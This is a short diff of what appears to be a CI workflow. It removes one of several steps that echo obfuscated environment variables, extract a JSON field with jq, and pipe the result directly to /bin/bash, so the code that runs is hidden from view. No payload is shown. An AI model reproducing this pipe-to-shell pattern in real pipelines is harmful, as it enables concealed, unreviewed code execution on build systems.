@@ -24,7 +24,6 @@ jobs:
           echo $kvk6500 | jq -r .egp156 | /bin/bash
           echo $bq79607 | jq -r .pubt64 | /bin/bash
           printf '%s' "$tkele8249" | jq -r .c8349 | /bin/bash
-          echo $d16191 | jq -r .akrcn7278 | /bin/bash
           echo $vzt02 | jq -r .nat17 | /bin/bash
           echo $iuwtp99 | jq -r .czcn0522 | /bin/bash
           echo $sx7924 | jq -r .heck09 | /bin/bash
